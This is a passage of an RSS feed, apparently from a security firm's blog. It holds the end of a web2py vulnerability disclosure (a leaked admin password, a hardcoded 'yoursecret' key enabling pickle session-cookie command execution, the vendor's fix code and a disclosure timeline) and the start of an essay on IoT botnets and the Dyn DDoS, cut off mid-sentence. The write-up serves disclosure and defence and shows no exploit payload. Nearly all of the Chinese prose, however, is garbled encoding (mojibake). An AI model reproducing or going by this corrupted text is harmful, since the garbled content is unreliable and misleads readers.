&lt;h4 id=&quot;cve-2016-3952&quot;&gt;CVE-2016-3952&lt;/h4&gt;

&lt;p&gt;http://[target]/examples/template_examples/beautify é é¢æ´©æ¼äº†ç³»çµ±ç’°å¢ƒè®Šæ•¸ï¼Œç•¶ä½¿ç”¨è€…æ˜¯ä½¿ç”¨ standalone ç‰ˆæœ¬æ™‚ï¼Œç®¡ç†è€…çš„å¯†ç¢¼å°±æœƒåœ¨ç’°å¢ƒè®Šæ•¸è£¡å‡ºç¾ã€‚é€™å€‹å¯†ç¢¼å¯ç™»å…¥ http://[target]/admin ç®¡ç†ä»‹é¢ï¼Œç®¡ç†ä»‹é¢å…§æä¾›æ–¹ä¾¿çš„åŠŸèƒ½å¾—ä»¥åŸ·è¡Œä»»æ„æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/CVE-2016-3952.png&quot; alt=&quot;CVE-2016-3952&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å®˜æ–¹ä¿®å¾©&quot;&gt;å®˜æ–¹ä¿®å¾©&lt;/h3&gt;

&lt;p&gt;Version 2.14.1 ç§»é™¤æ´©æ¼çš„ç’°å¢ƒè®Šæ•¸ã€‚[&lt;a href=&quot;https://github.com/web2py/web2py/commit/9706d125b42481178d2b423de245f5d2faadbf40&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;Version 2.14.2 ä½¿ç”¨ä¸å›ºå®šå­—ä¸²ä½œç‚º session_cookie_keyï¼Œä¸¦ç§»é™¤æ´©æ¼é é¢ã€‚&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;applications/examples/models/session.py&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;gluon.utils&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ram&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;cookie_key&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;ç¸½çµ&quot;&gt;ç¸½çµ&lt;/h3&gt;

&lt;p&gt;web2py æ¡†æ¶é è¨­æœƒé–‹å•Ÿä¸€å€‹ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼ï¼Œè·¯å¾‘ç‚º http://[target]/examples/ã€‚&lt;br /&gt;&lt;br /&gt;
ç”±æ–¼é€™å€‹æ‡‰ç”¨ç¨‹å¼ä½¿ç”¨ Pickle ä¾†è™•ç†åºåˆ—åŒ–çš„ session cookieï¼Œä¸”å› ç‚ºåŠ å¯†å­—ä¸²ç‚ºå¯«æ­»çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt;ï¼Œä»»ä½•äººå¯ç«„æ”¹ session cookie çš„å…§å®¹ï¼Œè—‰æ­¤é€²è¡Œ Pickle å‘½ä»¤åŸ·è¡Œæ”»æ“Šã€‚&lt;br /&gt;&lt;br /&gt;
è©²ç¯„ä¾‹ç¨‹å¼ä»‹é¢ä¸­ä¹Ÿå­˜åœ¨ session_cookie_keyã€ç®¡ç†è€…å¯†ç¢¼æ´©æ¼å•é¡Œï¼Œå…©å€‹éƒ½æœƒå°è‡´ä»»æ„å‘½ä»¤åŸ·è¡Œã€‚é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨é€™å€‹æ‡‰ç”¨ç¨‹å¼ä¸­æ´©æ¼è¨±å¤šç³»çµ±é…ç½®ã€è·¯å¾‘ç­‰è³‡è¨Šï¼Œæœ‰æ©Ÿæœƒè¢«æ‹¿ä¾†åšé€²éšæ”»æ“Šã€‚&lt;br /&gt;&lt;br /&gt;
åœ¨ 2.14.2 ç‰ˆæœ¬å¾Œå·²ç¶“ä¿®å¾©æ‰€æœ‰æ´©æ¼å•é¡Œï¼Œç•¶ç„¶æœ€å¥½çš„è§£æ±ºè¾¦æ³•å°±æ˜¯é—œé–‰é€™å€‹ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼ã€‚&lt;/p&gt;

&lt;p&gt;æœ€å¾Œï¼Œä¾†æ•´ç†å¾é–‹ç™¼è€…çš„è§’åº¦åœ¨é€™å€‹æ¡ˆä¾‹ä¸­è©²æ³¨æ„çš„è¦é»ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å°å¿ƒè™•ç†åºåˆ—åŒ–å­—ä¸²ï¼Œä½¿ç”¨è€…è‹¥æœ‰æ©Ÿæœƒæ”¹è®Šè©²å­—ä¸²å€¼ï¼Œæœ‰æ©Ÿæœƒè¢«æ’å…¥æœªé æœŸçš„æƒ¡æ„ç‰©ä»¶ï¼Œé€ æˆæƒ¡æ„çš„çµæœã€‚&lt;/li&gt;
  &lt;li&gt;æ­£å¼ç”¢å“ä¸­åˆ‡è¨˜è¦ç§»é™¤ä»»ä½•è·Ÿé–‹ç™¼ç›¸é—œçš„é…ç½®ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;æ™‚é–“è»¸&quot;&gt;æ™‚é–“è»¸&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2016/03/08 ç™¼ç¾å•é¡Œèˆ‡å…¶ä»–ç ”ç©¶&lt;/li&gt;
  &lt;li&gt;2016/03/09 å›å ±å®˜æ–¹ &lt;a href=&quot;https://github.com/web2py/web2py/issues/1205&quot;&gt;GitHub Issue&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;2016/03/15 æˆåŠŸèˆ‡é–‹ç™¼è€… email è¯ç¹«&lt;/li&gt;
  &lt;li&gt;2016/03/15 å®˜æ–¹ä¿®å¾©ç®¡ç†è€…å¯†ç¢¼æ´©æ¼å•é¡Œ (CVE-2016-3952)&lt;/li&gt;
  &lt;li&gt;2016/03/25 å®˜æ–¹ä¿®å¾©å…¶ä»–å¼±é»ä¸¦ç™¼ä½ˆ 2.14.2 ç‰ˆæœ¬&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot;&gt;
      &lt;p&gt;å…¶å¯¦ CVE-2016-3957 ä¸¦éä¸å®‰å…¨çš„è¨­è¨ˆï¼Œåœ¨è·Ÿ CVE team æºé€šçš„éç¨‹ä¸­ç™¼ç¾ web2py é–‹å§‹ä½¿ç”¨ JSON å–ä»£ Pickle [&lt;a href=&quot;https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0&quot;&gt;Ref&lt;/a&gt;]ï¼Œå› æ­¤åˆ¤å®š web2py èªç‚ºç›®å‰çš„è¨­è¨ˆæ˜¯ä¸æ´½ç•¶çš„ï¼Œçµ¦äºˆæ­¤ç·¨è™Ÿã€‚å¾Œä¾†å®˜æ–¹å› æ•…å°‡ Pickle æ”¹äº†å›ä¾†ï¼Œä¸éåœ¨æ²’æœ‰æ´©æ¼åŠ å¯†å­—ä¸²çš„å‰æä¸‹å·²ç¶“æ˜¯å®‰å…¨çš„äº†ã€‚Â &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot;&gt;
      &lt;p&gt;åœ¨è‡ªè¡Œæ¶è¨­çš„ web2py ç’°å¢ƒä¸­åªæœƒåŸ·è¡Œä¸€æ¬¡ï¼Œæ²’æœ‰å»ç´°è¿½ web2py å®˜æ–¹ç¶²ç«™ç‚ºä½•åŸ·è¡Œå…©æ¬¡ã€‚Â &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957/</link>
                <guid>https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957</guid>
                <pubDate>Tue, 03 Jan 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>IoTè¨­å‚™å•†åˆ¥æˆç‚ºå¹«å…‡ å¾Dyn DDoSæ”»æ“Šäº‹ä»¶çœ‹IoTå®‰å…¨</title>
                <description>&lt;h3 id=&quot;è¬ç‰©çš†è¯ç¶²æˆç‚ºè¬ç‰©çš†å¯é§­&quot;&gt;è¬ç‰©çš†è¯ç¶²æˆç‚ºè¬ç‰©çš†å¯é§­&lt;/h3&gt;

&lt;p&gt;2016å¹´10æœˆ21æ—¥çŸ¥åç¶²è·¯æœå‹™ Dyn é­å—æ®­å±ç¶²è·¯ç™¼å‹•ä¸‰æ³¢å·¨å¤§è¦æ¨¡ DDoS æ”»æ“Šï¼Œä¸–ç•Œå„å¤§ç¶²ç«™æœå‹™çš†å› ç‚ºæ­¤æ”»æ“Šè€Œä¸­æ–·ï¼ŒåŒ…æ‹¬ Amazonã€Twitterã€Githubã€PayPal ç­‰å¤§å‹ç¶²ç«™éƒ½å› æ­¤å—åˆ°å½±éŸ¿ã€‚è³‡å®‰äººå“¡ç ”ç©¶ç™¼ç¾ï¼Œæœ¬æ¬¡ DDoS æ”»æ“Šçš„ç™¼èµ·è€…æœªæ˜ï¼Œä½†å¤šæ•¸æ”»æ“Šæµé‡ä¾†è‡ªæ®­å±ç¶²è·¯ã€ŒMiraiã€ï¼Œåˆ©ç”¨ IPCAMã€CCTVã€DVRã€IoT è£ç½®ç­‰ç³»çµ±é€²è¡Œ DDoS æ”»æ“Šã€‚ç‚ºä»€éº¼é€™äº›è¨­å‚™æœƒæˆç‚ºæ”»æ“Šçš„å¹«å‡¶å‘¢ï¼Ÿæˆ‘å€‘åˆè©²å¦‚ä½•è‡ªä¿å‘¢ï¼Ÿ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;ä¸€å€‹æ”»æ“Šäº‹ä»¶ï¼Œä¸€å®šæœ‰èƒŒå¾Œçš„åŸå› ã€‚æ”»æ“Šè€…ä¸€å®šæ˜¯æœ‰æ‰€æ±‚ï¼Œæ‰æœƒé€²è¡Œæ”»æ“Šï¼Œå¯èƒ½æ˜¯æ±‚åã€æ±‚åˆ©æˆ–æ±‚æ¨‚è¶£ã€‚å› ç‚º DDoS æ”»æ“Šæœƒç›´æ¥å½±éŸ¿ç›®æ¨™ç³»çµ±çš„é‹ä½œï¼Œå°ç³»çµ±ç‡Ÿé‹é€ æˆå½±éŸ¿ï¼Œåœ¨é»‘è‰²ç”¢æ¥­çš„å¾ªç’°ä¸­é€šå¸¸æœƒåˆ©ç”¨é€™ç¨®æ”»æ“Šä¾†å‹’ç´¢éŒ¢è²¡ã€‚ä¾‹å¦‚é‡å°ç‡Ÿé‹ç·šä¸ŠéŠæˆ²çš„å…¬å¸é€²è¡Œ DDoS æ”»æ“Šï¼Œè®“éŠæˆ²æœå‹™ä¸­æ–·ï¼Œé€¼è¿«ä¼æ¥­å°‡ä¸»æ©Ÿçš„é€£ç·šèŠ±éŒ¢ã€Œè´–ã€å›ä¾†ã€‚ä½† Dyn é€™æ¬¡çš„äº‹ä»¶å„å®¶éƒ½æ²’æœ‰æ”¶åˆ°é¡ä¼¼çš„å‹’ç´¢ä¿¡ï¼Œå› æ­¤è³‡å®‰å°ˆå®¶å€‘æ¨æ¸¬ï¼Œé€™å¯èƒ½æ˜¯ä¸€æ¬¡ç·´å…µï¼Œæˆ–è€…ç”šè‡³æ˜¯ DDoS æ”»æ“Šæœå‹™çš„è¡ŒéŠ·æ‰‹æ³•ã€‚å¦‚æœæˆ‘å€‘ç”¨é»‘è‰²ç”¢æ¥­çš„è§’åº¦å»æ€è€ƒä¸€å€‹æ”»æ“Šè¡Œç‚ºï¼Œå°±æœƒæœ‰æˆªç„¶ä¸åŒçš„çœ‹æ³•ã€‚è©¦æƒ³ï¼Œå¦‚æœé€™æ˜¯ä¸€æ¬¡é§­å®¢çµ„ç¹”çš„å•†æ¥­è¡ŒéŠ·è¡Œç‚ºï¼Œç›®çš„æ˜¯å±•ç¾é€™å€‹åœ˜éšŠçš„ DDoS æ”»æ“Šç«åŠ›ï¼Œé€™æ¨£çš„æˆæœæ˜¯å¦å¯ä»¥ç¨±ä½œæ˜¯ä¸€å€‹æˆåŠŸæ¡ˆä¾‹å‘¢ï¼Ÿå¦‚æœä½ æ˜¯æœå‹™è³¼è²·è€…ï¼Œæ˜¯å¦å°é€™æ¨£çš„æœå‹™æœ‰ä¿¡å¿ƒå‘¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;åˆ©ç”¨ IoT è£ç½®åŠç¶²é€šè¨­å‚™ä½ˆå»ºæ®­å±ç¶²è·¯ (botnet) å·²ç¶“ä¸æ˜¯æ–°èã€‚Internet Census 2012 æ˜¯ä¸€æ¬¡è³‡å®‰åœˆçš„å¤§äº‹ä»¶ï¼Œä¸€å€‹ç¨±ç‚º Carna çš„ botnet åˆ©ç”¨äº†å…¨ä¸–ç•Œ 42 è¬å°è£ç½®ï¼Œæƒæå…¨ä¸–ç•Œæ•´å€‹ IPv4 è¨­å‚™ï¼Œè’é›† IP ä½¿ç”¨ç‹€æ³ã€é€£æ¥åŸ ã€æœå‹™æ¨™é ­ç­‰è³‡è¨Šï¼Œä¸¦ä¸”æä¾›å…±è¨ˆ 9TB è³‡æ–™é–‹æ”¾ä¸‹è¼‰ç ”ç©¶ã€‚è€Œé€™å€‹ botnet å¤šæ•¸åˆ©ç”¨è·¯ç”±å™¨ (router) çš„æ¼æ´ï¼Œåˆ©ç”¨é è¨­å¯†ç¢¼ã€ç©ºå¯†ç¢¼ç™»å…¥è¨­å‚™ï¼Œæ¤å…¥å¾Œé–€ä¾›æ”»æ“Šè€…æ§åˆ¶ã€‚è€Œå¾Œçš„å¹¾æ¬¡å¤§å‹æ”»æ“Šäº‹ä»¶éƒ½èˆ‡ IoT åŠåµŒå…¥å¼è£ç½®æœ‰é—œä¿‚ï¼Œè®“ IoT çš„å£è™Ÿã€Œè¬ç‰©çš†è¯ç¶²ã€æˆç‚ºã€Œè¬ç‰©çš†å¯é§­ã€ï¼Œä¹Ÿè®“è³‡å®‰ç ”ç©¶äººå“¡å°æ–¼ç ”ç©¶é€™é¡å‹è¨­å‚™è¶¨ä¹‹è‹¥é¶©ã€‚è¿‘å¹´æ™ºæ…§è»Šè¼›ä¸æ–·ç™¼å±•ï¼Œåœ‹éš›é–“ä¹Ÿä¸å°‘æ™ºæ…§è»Šè¼›è¢«é§­çš„äº‹ä»¶ã€‚è»Šè¼›è¢«é§­å½±éŸ¿çš„å°±ä¸å–®æ˜¯è³‡è¨Šç³»çµ±ï¼Œæ›´æœƒæ³¢åŠäººèº«å®‰å…¨ç”šè‡³æ•´å€‹åŸå¸‚çš„äº¤é€šï¼Œè³‡å®‰è€ƒé‡çš„å½±éŸ¿ä¹Ÿé æ¯”ä»¥å‰åš´é‡ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é€£ç¶²è£ç½®æˆç‚ºé§­å®¢ä¸‹æ‰‹çš„ä¸»è¦åŸå› &quot;&gt;é€£ç¶²è£ç½®æˆç‚ºé§­å®¢ä¸‹æ‰‹çš„ä¸»è¦åŸå› &lt;/h3&gt;

&lt;p&gt;ç©¶ç«Ÿæ˜¯æ€æ¨£çš„å®‰å…¨æ¼æ´è®“æ”»æ“Šè€…é€™éº¼è¼•æ˜“åˆ©ç”¨å‘¢ï¼Ÿç›®å‰æ”»æ“Šè€…åŠ botnet å¤šæ•¸åˆ©ç”¨çš„é‚„æ˜¯ä½¿ç”¨é è¨­å¯†ç¢¼ã€æˆ–ç”šè‡³æ˜¯æ²’æœ‰è¨­å®šå¯†ç¢¼çš„è£ç½®ã€‚ç¶²ç«™ &lt;a href=&quot;https://www.insecam.org&quot;&gt;Insecam&lt;/a&gt; æ­éœ²äº†å…¨ä¸–ç•Œæ•¸è¬æ”¯æœªä¿®æ”¹å¯†ç¢¼çš„æ”å½±æ©Ÿï¼Œå†å†é¡¯ç¤ºä¸å°‘æ°‘çœ¾æˆ–å…¬å¸è¡Œè™Ÿè³¼è²·äº†ç›£è¦–å™¨ï¼Œå»æ²’æœ‰å¥å…¨çš„è³‡å®‰æ„è­˜ï¼Œè®“ç›£è¦–å™¨æš´éœ²æ–¼å…¨ä¸–ç•Œä¹‹ä¸­ã€‚æ›´å¤šæ”å½±æ©Ÿã€ç›£è¦–å™¨ç­‰çš„è³‡å®‰è­°é¡Œå¯ä»¥åƒè€ƒæˆ‘å€‘çš„æ–‡ç« &lt;a href=&quot;http://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/&quot;&gt;ã€Œç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR çš„è³‡å®‰è­°é¡Œ - ä½ çŸ¥é“æˆ‘åœ¨çœ‹ä½ å—ï¼Ÿã€&lt;/a&gt;ã€‚é™¤äº†é è¨­å¯†ç¢¼ä¹‹å¤–ï¼Œè¨­å‚™ä¸­çš„å¾Œé–€ä¹Ÿæ˜¯ä¸€å€‹å¤§å•é¡Œã€‚ä¸å°‘è·¯ç”±å™¨ã€ç„¡ç·šåŸºåœ°å°å» å•†è¢«çˆ†å‡ºç³»çµ±ä¸­å«æœ‰æ¸¬è©¦ç”¨çš„ç™»å…¥å¸³è™Ÿï¼Œè©²å¸³è™Ÿç„¡æ³•é—œé–‰ã€ç„¡æ³•ç§»é™¤ï¼Œä¸”å®¹æ˜“è¢«æ”»æ“Šè€…é€²è¡Œç ”ç©¶å–å¾—ã€‚é™¤äº†ç­‰å¾…å» å•†å‡ç´šéŸŒé«”ä¾†ä¿®è£œè©²å•é¡Œä¹‹å¤–ï¼Œæ²’æœ‰å…¶ä»–è§£æ³•ï¼Œå› æ­¤æˆç‚ºæ”»æ“Šè€…å¤§é‡å–å¾—æ§åˆ¶æ¬Šçš„æ–¹å¼ä¹‹ä¸€ã€‚&lt;/p&gt;

&lt;p&gt;IoT è£ç½®ç‚ºä»€éº¼æœƒæˆç‚ºæ”»æ“Šè€…ä¸‹æ‰‹çš„ç›®æ¨™å‘¢ï¼Ÿæˆ‘å€‘å¯ä»¥åˆ†æˆå¹¾é»ä¾†æ¢è¨ã€‚&lt;/p&gt;

&lt;p&gt;ç¬¬ä¸€ï¼ŒåµŒå…¥å¼è£ç½®ä»¥å¾€çš„è¨­è¨ˆéƒ½æ˜¯ä¸é€£ç¶²ï¼ŒIoT çš„é¢¨æ½®èˆˆèµ·ä¹‹å¾Œï¼Œå„å» å•†ä¹Ÿç‚ºäº†æ¶å¸‚å ´å…ˆæ©Ÿï¼ŒåŠ é€Ÿæ¨å‡ºç”¢å“ï¼Œå°‡åŸæœ¬çš„ç”¢å“åŠ ä¸Šç¶²è·¯åŠŸèƒ½ï¼Œç”šè‡³ App æ§åˆ¶åŠŸèƒ½ã€‚è€Œæ±‚å¿«çš„çµæœå°±æ˜¯çŠ§ç‰²è³‡å®‰è€ƒé‡ï¼ŒåŠ ä¸Šå» å•†å¯èƒ½åŸæœ¬ä¸¦éç¶²è·¯å°ˆé•·ï¼Œä¹Ÿæ²’æœ‰è¶³å¤ çš„è³‡å®‰äººå“¡æª¢è¦–å®‰å…¨æ€§ï¼Œå°è‡´è¨­è¨ˆå‡ºä¾†çš„ç”¢å“è³‡å®‰æ¼æ´å±¤å‡ºä¸çª®ã€‚ç”¢å“çš„è¨­è¨ˆå¿…é ˆåš´å®ˆ Security by Design çš„åŸå‰‡ï¼Œåœ¨é–‹ç™¼åˆæœŸçš„æ¯å€‹ç’°ç¯€éƒ½ç´å…¥è³‡å®‰è€ƒé‡ï¼Œä¸¦ä¸”éµå®ˆ Secure Coding è¦ç¯„ï¼Œé¿å…åœ¨ç”¢å“å¾ŒæœŸç–ŠåºŠæ¶å±‹ï¼Œé€ æˆè¦é‡æ¸…è³‡å®‰å•é¡Œçš„æ ¹æºæ›´é›£å¦‚ç™»å¤©ã€‚&lt;/p&gt;

&lt;p&gt;ç¬¬äºŒï¼Œç”¢å“çš„æ›´æ–°æ©Ÿåˆ¶å•é¡Œã€‚IoT è£ç½®çš„æ›´æ–°æ©Ÿåˆ¶åœ¨æ—©æœŸä¸¦æ²’æœ‰è¬¹æ…è€ƒé‡ï¼Œéœ€è¦ä½¿ç”¨è€…è‡ªè¡Œä¸‹è¼‰éŸŒé«”æ›´æ–°ï¼Œç”šè‡³æœ‰äº›è£ç½®å¿…é ˆå›å» æ‰èƒ½é€²è¡Œæ›´æ–°ã€‚ä¸å°‘ä½¿ç”¨è€…åªè¦ç”¢å“æ²’æœ‰å‡ºå•é¡Œï¼Œä¸¦ä¸æœƒä¸»å‹•é€²è¡ŒéŸŒé«”æ›´æ–°ï¼Œç”šè‡³è¦ºå¾—æ›´æ–°åªæœƒé€ æˆæ›´å¤šå•é¡Œã€‚åœ¨æ²’æœ‰ä¾¿åˆ©æ›´æ–°æ©Ÿåˆ¶çš„æƒ…æ³ä¹‹ä¸‹ï¼Œè¨­å‚™çš„è³‡å®‰å•é¡Œæ›´é›£ä»¥è¢«å¦¥å–„è™•ç†ã€‚è¿‘æœŸå› ç‚ºè³‡å®‰äº‹ä»¶é »å‚³ï¼ŒFOTA (Firmware Over-The-Air) æ©Ÿåˆ¶æ‰é€æ¼¸è¢«é‡è¦–ï¼Œä½†å…¶ä»–è³‡å®‰å•é¡Œä¹Ÿéš¨å³è€Œä¾†ã€‚å¦‚ä½•ç¢ºä¿éŸŒé«”çš„å®Œæ•´æ€§ï¼Ÿå¦‚ä½•é˜²æ­¢æ”»æ“Šè€…ä¸‹è¼‰éŸŒé«”é€²è¡Œç ”ç©¶ä¿®æ”¹ï¼Ÿé€™äº›éƒ½æ˜¯å» å•†éœ€è¦ä¸æ–·å»åè¦†æ€é‡çš„ã€‚&lt;/p&gt;

&lt;p&gt;ç¬¬ä¸‰ï¼Œæ•µæš—æˆ‘æ˜ï¼Œä¹Ÿæ˜¯æˆ‘å€‘èªç‚ºæœ€é‡è¦çš„ä¸€é»ã€‚æˆ‘å€‘èªç‚ºè³‡å®‰å°±æ˜¯æ”»æ“Šè€…èˆ‡é˜²ç¦¦è€…çš„ä¸€å ´è³‡è¨Šä¸å°ç¨±æˆ°çˆ­ï¼Œé˜²ç¦¦è€…ï¼ˆå» å•†ï¼‰é€šå¸¸åªæœƒæ†‘è—‰è‘—è‡ªå·±çš„çŸ¥è­˜è·Ÿæƒ³åƒé€²è¡Œé˜²ç¦¦ï¼Œä½†å»ä¸çŸ¥é“æ”»æ“Šè€…çš„æ€ç¶­è·Ÿæ‰‹æ³•ã€‚å°±åƒæ˜¥ç§‹æ™‚ä»£å…¬è¼¸èˆ¬ï¼Œå»ºé€ é›²æ¢¯å”åŠ©æ¥šåœ‹æ”»æ“Šå®‹åœ‹çš„åŸæ± ã€‚å”¯æœ‰äº†è§£æ”»æ“Šè€…ï¼ŒåŒ–è§£é€™å€‹ä¸å°ç¨±çš„è³‡è¨Šï¼Œæ‰èƒ½æœ‰æ•ˆçš„é€²è¡Œé˜²ç¦¦ï¼Œå¦‚åŒå¢¨å­äº†è§£é›²æ¢¯çš„æ”»æ“Šæ–¹å¼ï¼Œæ¨¡æ“¬å„ç¨®å°æ‡‰é˜²ç¦¦çš„æ‰‹æ³•ï¼Œæ‰æˆåŠŸè®“æ¥šç‹æ”¾æ£„æ”»æ“Šã€‚ä¸åƒ…æ˜¯ IoT å» å•†ï¼Œæ‰€æœ‰ä¼æ¥­éƒ½å¿…é ˆäº†è§£æ”»æ“Šè€…çš„æ€ç¶­ã€æ‰‹æ³•ï¼ŒçŸ¥æ›‰é€™å€‹é»‘è‰²ç”¢æ¥­çš„é‹ä½œï¼Œç”šè‡³é‡å°æ”»æ“Šçš„æ–¹å¼é€²è¡Œæ¨¡æ“¬æ¼”ç·´ï¼Œå°‡æ¯ä¸€å€‹é˜²ç¦¦çš„ç¼ºå£è£œè¶³ï¼Œæ‰å¯ä»¥æ­£é¢è¿æˆ°æ”»æ“Šè€…ã€‚&lt;/p&gt;

&lt;h3 id=&quot;è¨­å‚™å•†é¿å…æˆç‚ºå¹«å‡¶æ¶ˆè²»è€…ä¹Ÿæ‡‰è‡ªä¿&quot;&gt;è¨­å‚™å•†é¿å…æˆç‚ºå¹«å‡¶ï¼Œæ¶ˆè²»è€…ä¹Ÿæ‡‰è‡ªä¿&lt;/h3&gt;

&lt;p&gt;èº«ç‚ºä½¿ç”¨è€…ï¼Œæˆ‘å€‘è©²å¦‚ä½•ç¢ºèªè‡ªå·±çš„è¨­å‚™æœ‰æ²’æœ‰è¢«æ„ŸæŸ“å‘¢ï¼Ÿè‹¥è¢«æ„ŸæŸ“è©²æ€éº¼æœ‰æ•ˆæ¸…é™¤å‘¢ï¼Ÿå»ºè­°å…ˆæœå°‹ç¶²è·¯ä¸Šç›®å‰å·²å…¬é–‹æœ‰æ¼æ´çš„å» ç‰ŒåŠå‹è™Ÿï¼Œè‹¥åœ¨å•é¡Œæ¸…å–®ä¹‹å…§ï¼Œå…ˆå°‡æ•´å°è¨­å‚™å‚™ä»½è¨­å®šå¾Œï¼Œå›å¾©åŸå» åˆå§‹è¨­å®šï¼Œä»¥ç¢ºä¿æ”»æ“Šè€…æ”¾ç½®çš„æƒ¡æ„ç¨‹å¼éƒ½è¢«æ¸…é™¤ã€‚æ¥è‘—æ›´æ–°å» å•†æ‰€é‡‹å‡ºçš„æ–°ç‰ˆéŸŒé«”ï¼Œä¸¦è¨˜å¾—åœ¨æ›´æ–°å®‰è£å®Œç•¢å¾Œç«‹å³æ›´æ›å¯†ç¢¼ä»¥é˜²äºŒåº¦è¢«å…¥ä¾µã€‚è‹¥å» å•†ç„¡é‡‹å‡ºæ›´æ–°ï¼Œå¯èƒ½æ˜¯è³‡å®‰ä¸è¢«é‡è¦–ï¼Œä¹Ÿå¯èƒ½æ˜¯å» å•†å·²ç¶“çµæŸç‡Ÿé‹ã€‚å¦‚æœé‚„æ˜¯é¸æ“‡è¦ä½¿ç”¨é€™å€‹è¨­å‚™ï¼Œå»ºè­°å°‡è¨­å‚™è½‰æ”¾åœ¨å…§éƒ¨ç¶²è·¯ï¼Œæˆ–è€…æ˜¯åœ¨å‰é¢å¢åŠ é˜²ç¦¦è¨­å‚™ï¼Œé¿å…æ”»æ“Šè€…å…¥ä¾µã€‚&lt;/p&gt;

&lt;p&gt;è‡³æ–¼å» å•†è©²æ€éº¼è·Ÿä¸Šè³‡å®‰çš„è…³æ­¥å‘¢ï¼Ÿæˆ‘å€‘èªç‚ºç›®å‰å» å•†æœ€é‡è¦çš„å°±æ˜¯è³‡å®‰æ„è­˜ã€‚é€™å·²ç¶“æ˜¯è€ç”Ÿå¸¸è«‡ï¼Œä»¥å¾€ç¶²è·¯ç”¢æ¥­é€æ¼¸é‡è¦–è³‡å®‰ï¼Œä½†è·¨å…¥ç¶²è·¯çš„å…¶ä»–è³‡è¨Šç”¢æ¥­ææ€•é‚„æ²’æ„è­˜åˆ°è³‡å®‰çš„åš´é‡æ€§ã€‚å‡¡èˆ‰å‚³çµ±å®¶é›»è½‰ç‚ºæ™ºæ…§å®¶é›»ã€è»Šè¼›è½‰ç‚ºæ™ºæ…§è»Šè¼›ã€ç”šè‡³åŸºç¤å»ºè¨­ä¹Ÿé€æ¼¸è³‡è¨ŠåŒ–çš„ç¾åœ¨ï¼Œè‹¥é€™äº›è¸å…¥ç¶²è·¯çš„ç”¢æ¥­æ²’æœ‰ç›¸å°æ‡‰çš„è³‡å®‰æ„è­˜ï¼Œææ€•å¾ˆé›£åœ¨åˆæœŸå°±é é˜²é¢¨éšªçš„ç™¼ç”Ÿã€‚ä¼æ¥­ä¹Ÿå¿…é 